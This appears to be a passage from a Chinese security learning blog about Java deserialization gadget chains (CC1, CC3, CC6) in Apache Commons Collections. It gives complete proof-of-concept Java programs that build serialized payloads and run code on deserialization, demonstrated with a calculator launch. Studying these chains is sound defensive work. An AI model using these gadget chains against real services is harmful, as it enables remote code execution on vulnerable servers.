java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机。\nCC1的LazyMap链：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机\n结合CC6 HashMap链的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机\nHashSet链的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet o = new HashSet(); o.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 好处 首先就是在利用POC的时候一定要注意java版本的问题，结合CC6的基本在java7和java8都通杀。\n对于使用InstantiateTransformer类，当不允许使用InvokerTransformer类的时候就可以使用这个。\n","date":"2024-07-17T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc3/","title":"CC3"},{"content":"CC1 前面说过了URLDNS这条链，现在我们就可以开始学习Common-Collections利用链，这是反序列化学习中不可逃过的一关。\n小的知识点 来补充一下之前一直遇到的一个知识点，JAVA基础，一直在忘记，就是数组问题，这里简单记录一下数组的初始化问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //第一种 使用数组来表示“一组”int类型,然后再分开赋值即可 int[] ns = new int[5]; ns[0] = 68; ns[1] = 66; ... 可以使用 数组变量.length 获取数组大小 //第二种 定义数组时直接指定初始化的元素，这样就不必写出数组大小，而是由编译器自动推算数组大小。 int[] ns = new int[]{12,23,24,45,45}; //第三种 还可以在第二步基础上进一步简写 int[] ns = {11,22,33,44,55}; //第四种 这里再简单讲讲字符串数组 String[] names = {\u0026#34;haha\u0026#34;,\u0026#34;quke\u0026#34;,\u0026#34;erqieha\u0026#34;}; 暂时需要注意的就是这四个，现在就正式开始学习CC链。\nCommons Collections 前置说明 Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。\nCommons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。\n由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条。\n学习路线：CC1 -\u0026gt; CC6 -\u0026gt; CC3 -\u0026gt; CC5 -\u0026gt; CC7 -\u0026gt; CC2 -\u0026gt; CC4 (其中CC2和CC4是common-collections4的利用链)\n环境搭建 Apache Commons项目需要导入，所以我们在这里需要搭建环境，还是使用maven来导包，修改pom.xml即可，比如我这里要导一个cc3.2.1，加上如下：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 再更新一下项目即可。\n下载并且配置相应源码 因为JDK自带·的包里面有些文件是反编译的.class文件导致我们没法清楚看懂代码，为了方便调试，我们需要将它们转变为.java文件，这就需要我们安装响应的源码。\n下载地址：https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\n先原本jdk目录下的src.zip解压到当前目录，在链接中点击zip下载后解压，在/src/share/classes中找到sun文件，把其复制到原本jdk中src.zip的解压文件。\n最后再在idea中把src文件夹添加到原路径下即可：\n动态代理 主要内容就回去看动态代理笔记的内容，主要就是一个点：当我们调用某个动态代理对象的方法时，都会触发代理类的Invoke方法，并传递对应的内容。\n正式分析 测试环境：\nJDK 8u65 commons-collections 3.2.1 需要了解的类和接口 AbstractMapDecorator 在CC库中提供了一个抽象类org.apache.commons.collections.map.AbstractMapDecorator，这个类是Map的扩展，从名字来看，这是一个基础的装饰器，用来给map提供附加功能，被装饰的map存在该类的属性中，并且将所有的操作都转发给这个map。\n这个类有很多实现类，各个类触发的方式不同，重点关注的是TransformedMap 以及LazyMap。\nTransformedMap org.apache.commons.collections.map.TransformedMap类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer来定义，Transformer 在 TransformedMap 实例化时作为参数传入。可以简单看看这个类的定义：\n这个类继承了一个类和实现了一个接口。再看源码其实可以发现很多方法都实现了transform()方法\n这里给一个示例利用代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static Transformer keyTransformer = new Transformer() { public Object transform(Object input) { int num = (int) input; num += 1; return (Object) num; } }; public static Transformer valueTransformer = new Transformer() { public Object transform(Object input) { String str = input.toString(); return str + \u0026#34;1\u0026#34;; } }; public static void main(String[] args) { HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(1, \u0026#34;a\u0026#34;); System.out.println(\u0026#34;初始化map:\u0026#34; + hashMap); // 创建TransformedMap Map map = TransformedMap.decorate(hashMap, keyTransformer, valueTransformer); map.put(2, \u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.put(1, \u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.remove(1); System.out.println(\u0026#34;transformMap:\u0026#34; + map); } } 运行后的输出结果：\n1 2 3 4 初始化map:{1=a} transformMap:{1=a, 3=b1} transformMap:{1=a, 2=w1, 3=b1} transformMap:{2=w1, 3=b1} 其实这里出现这个结果的原因还是和对象相关，可以来调试一下：\n这里首先了解一下匿名类是什么，可以参考这个文章，就是可以实现一个类中包含另外一个类，且不需要提供任何的类名直接实例化。主要是用于在我们需要的时候创建一个对象来执行特定的任务，可以使代码更加简洁。\n重要说明：首先在这串代码使用匿名类实现了Transformer接口，创建了一个对象，代码都使用匿名类实现了Transformer接口，创建了一个临时的类实例（即对象），并将这个类实例赋值给了keyTransformer和valueTransformer并都重写了transform()方法，这个是最重要的。（重要的是看代码，一看就懂了）\n然后开始调试：\n重要看后面的put那部分，第一个就是HashMap类的put方法，就是放入一对键值对，不多说。重点看后面。\n然后调用\n跟进源码：\n即返回一个TransformedMap对象，并且此时的keyTransformer和valueTransformer对应自定义的匿名类。\n然后加断点：\n然后现在来看对应的变量的值：\n重点看值，注意valueTransformer和keyTransformer的值为Test$2..和Test$1..，相互对比到来看，可以很容易看出这种格式就是代表匿名类，而不是一个Test类实例。\n在后续的map.put()中，调用的就是TransformedMap类的put方法：\n然后就会调用transformKey方法，源码如下：\n此时就会调用keyTransformer的transform方法，此时调用的就是匿名类的transform方法，那么就是\nvalueTransformer.transformer()同理。逻辑是这样，并且在调试过程中也同样这这个过程。\n继续看map.put()方法：\n1 return this.getMap().put(key, value); 这个getMap对应TransformedMap的父类AbstractInputCheckedMapDecorator的父类AbstractMapDecorator的getMap()方法，源码为：\n1 2 3 protected Map getMap() { return this.map; } 结合前面的实例化的描述，可以知道这里的map即HashMap类实例，所以这里会再调用HashMap的put方法放入一对修饰后的键值对。\n后面那个同理\n最后会调用HashMasp类的remove方法来去掉一个键值对。\n代码分析结束，对于这一段示例代码就需要理解透彻，了解其中的运行过程与逻辑，后面会有用。\n也就是说当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 put 方法时），就会触发相应参数的 Transformer 的 transform() 方法。\nLazyMap org.apache.commons.collections.map.LazyMap与TransformedMap类似，这个类触发transform()方法的点就在于调用get()方法时传入的key不存在，看一下get()方法的源码：\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 再看下面：\n可以知道LazyMap类继承于AbstractMapDecorator。\norg.apache.commons.collections.map.DefaultedMap与LazyMap具有相同功能，同样是get()方法会触发transform 方法。\nTransformer org.apache.commons.collections.Transformer是一个接口类，源代码如下：\n1 2 3 4 5 package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); } 它提供了一个transform()方法，用来定义具体的转换逻辑。\n在Commons Colection 项目中，程序提供了21个Transformer 的实现类，用来实现不同的对TransformedMap 中的 key/value 进行修改的功能\n重点关注几个实现类\nInvokerTransformer org.apache.commons.collections.functors.InvokerTransformer，这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，来看一下它的transform方法源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException var6) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException var7) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, var7); } } } 重点就是try部分代码：\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); 这里使用反射获取方法并使用invoke()方法调用这个方法，看看这里需要利用的几个参数：\n1 2 3 private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; 赋值方法也在构造函数里面，如下：\n1 2 3 4 5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } 尝试自己构造，测试代码：\n1 2 3 4 5 6 7 8 9 10 package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.Runtime; public class Test { public static void main(String[] args) { InvokerTransformer x = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); x.transform(Runtime.getRuntime()); } } 成功弹出计算机： ChainedTransformer org.apache.commons.collections.functors.ChainedTransformer类也是Transformer的实现类，关键源码如下：\n1 2 3 4 5 6 7 8 9 10 11 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } 这里的重点就是这个类自己维护了一个Transformer数组，在调用ChainedTransformer的transform方法时，会循环数组，依次调用 Transformer 数组每个 trandform方法，并将结果传递给下一个 Transformer。\n这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。\nConstantTransformer org.apache.commons.collections.functors.ConstantTransformer是返回一个固定常量的Transformer，在初始化时储存了一个Object，后续的调用会直接返回这个Object。关键源码如下：\n1 2 3 4 5 6 7 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } 这个类用于和ChainedTransformer配合，将其结果传入InvokerTransformer来调用我们指定的类的指定方法。\n攻击构造 CC1这里有两条链可以利用，分别是利用TransformedMap类和LazyMap类，现在来分别说明一下。\nTransformedMap链 基本本地代码 这里就结合到前面知识点，来构造反序列化的恶意利用代码。现在我们构造的最终的利用点，就是Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)，在这里使用TransformedMap 触发，本地demo如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); } } 说明一下这串代码的作用，先说后面的利用代码：\n1 2 3 HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); 这部分代码只要理解到了前面在TransformedMap类部分给的示例代码基本就可以理解了。所以链子起始点就是\n现在来看流程，打断点如下：\n然后就继续跟进，由于我们传入的keyTransformer就是ChainedTransformer类对象，所以这里调用的transform()方法时，调用的就是ChainedTransformer类的transform()方法，如下：\n现在来看我们给ChainedTransformer类传入的数组：\n1 2 3 4 5 6 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); //注意理解 1.然后现在就是调用的传入的数组第一个参数的transform方法，即ConstantTransformer类的transform()方法（此时的object为10）：\n这里的transform方法会直接返回我们实例化时定义的Runtime.class，所以这里的10最终是没用的，这步过后object的值变为了Runtime对象，即class java.lang.Runtime。\n2.然后现在调用的就是数组第二个值的类实例化对象，也就是\n1 new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}) 继续跟进\n注意看input.getClass()这一步过后的cls的值，居然变成了Class对象，这也是最开始没想通的（这里的Input不是一个类的实例化对象），也就是对任何类的class对象使用getClass()方法时都会返回class java.lang.Class。\n然后这里调用getMethod()方法获取Class对象的getMethod()方法并在return的地方使用invoke()方法来获取Runtime类的getRuntime()方法（getRuntime方法为静态方法）\n所以现在的object变为Runtime里面的getRuntime()方法。\n3.继续，现在到了第三个值的类实例化对象，也就是：\n1 new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}) 还是进入InvokerTransformer类的transform方法\n这里需要注意的同样的是getClass()那里，由于我传入的是一个getRuntime()方法的class对象，所以这里返回的是class java.lang,reflect.Method，然后使用反射获取Method类中的invoke方法，最后再在return部分调用invoke方法来利用反射获取的invoke()方法，形如：\n1 2 3 4 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //这样就可以直接执行方法从而获取Runtime类的实例化对象，还是和这个方法是static有关 所以在这里应该就是相当于直接执行getRuntime()方法（注意理解对比反射的知识点，这里的的用法需要理解记忆）\n所以在这一步后可以获取到new Runtime的实例。\n即现在的object的值为Runtime类的实例\n4.现在就到了数组的最后一个值，即：\n1 new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) 然后后面就是获取Runtime类的exec方法，并在invoke时传入calc弹出计算机。\n5.总结\n最后简单总结一下chain链中的流程：\n使用ConstantTransformer的transform方法返回Runtime.class 再在InvokerTransformer的transform方法获取getMethod方法并利用获取getRuntime()方法 再在InvokerTransformer的transform中获取invoke方法来调用getRuntime()方法从而获取到Runtime类实例。 最后还是在InvokerTransformer的transform方法获取到exec方法并传入calc弹出计算机 分析结束。\n其实还可以更简单，结合getRuntime()方法的特性，可以如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; class Test{ public static void main(String[] args){ ChainedTransformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(\u0026#34;exec\u0026#34; , new Class[]{ String.class },new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map ctf =TransformedMap.decorate(hashMap,chain,null); ctf.put(10,\u0026#34;xxx\u0026#34;); } } 同样成功弹出计算机\n综上第二种的简化代码更简洁，第一种偏技巧性，都要理解学习利用。\n但是第二种代码本身在具体的运用中并没有用，这是因为Runtime类并没有实现Serializable接口，而解决方法就是第一种，所以在实际运用中还是使用的第一种。\n实际利用 上面的代码只是一个用来在本地测试的类，并且是我们通过构造代码来启用第一个transform()方法继而实现的链子。在实际反序列化漏洞中，我们需要它的readObject代码逻辑中有类似Map.put方法的操作。\n在这里可以利用到的类就是sun.reflect.annotation.AnnotationInvocationHandler。\n现在来看这个类的readObject()方法（需要注意的是这是8u71以前的代码，8u71以后做了一些修改，这个后面再说）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } 重点关注foreach语句。在这里Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()用于遍历Map，可以参考这个文章，而String name = memberValue.getKey();语句和Object value = memberValue.getValue();语句用于获取键值对。\n这里的重点就是这个setValue()方法了，这里简单给出这个调用链：\n1 AnnotationInvocationHandler#readObject() ==\u0026gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==\u0026gt;TransformedMap#checkSetValue 在TransformedMap这里就可以启动前面构造的调用链\n同时在这里可以看出是利用的valueTransformer，所以在调用decorate()方法初始化时要不同于前面的基本代码，需要改位置，如下：\n1 Map map2 = TransformedMap.decorate(hashMap,null,chain); 这样才能保证成功调用。现在就围绕这条链子来进行阐述。\n1.现在来看memberValues的赋值点：\n这里由于AnnotationInvacationHandler属jdk内部类，无法直接引用且被实例化，所以只能利用反射获取构造方法，将修饰过的Map添加进去。\n注意看AnnotationInvacationHandler的构造方法，简单说明一下参数问题：\n对于第一个参数Class\u0026lt;? extends Annotation\u0026gt; type，简单说明一下：形如**\u0026lt;？ extends Collection\u0026gt;** 